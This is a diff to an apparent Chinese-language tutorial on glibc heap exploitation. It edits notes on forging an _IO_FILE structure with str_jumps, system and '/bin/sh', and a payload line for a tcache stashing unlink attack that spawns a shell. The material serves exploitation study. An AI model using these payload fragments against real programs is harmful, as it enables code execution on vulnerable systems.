@@ -1383,7 +1383,7 @@ __注意:__
 
 __libc版本:__
 
-glibc2.34之前
+glibc2.34之前，需要有`free_hook`
 
 __危害:__
 
@@ -1418,6 +1418,7 @@ fake_IO_FILE_plus的布置如下:
 # fake_IO_FILE = set_value(fake_IO_FILE, 0x20, 0)               # _IO_write_base
 # fake_IO_FILE = set_value(fake_IO_FILE, 0x60, BINSH)
 # fake_IO_FILE = set_value(fake_IO_FILE, 0x78, system)
+# fake_IO_FILE = set_value(fake_IO_FILE, 0xC0, 0x0)             # _mode <= 0
 # fake_IO_FILE = set_value(fake_IO_FILE, 0xD8, str_jumps)       # vtable
 ```
 
@@ -1602,7 +1603,7 @@ add(36, 0x110)
 add(37, 0x200)
 
 # 指向伪造的fake_chunk (0x2348)
-edit(32, b'\x00' * 0x110 + p64(0) + p64(0x111) + p64(heap_base + 0xfe10) + p64(free_hook - 0x18 - 0x10))
+edit(41, HOP(heap_base + 0x128c0, str_jumps, 0x100, b'/bin/sh\x00' + p64(0) + p64(0) + p64(system))[0x10:])
 
 # 触发tcache stashing unlink attack漏洞
 add(45, 0x2a0 - 0x10)
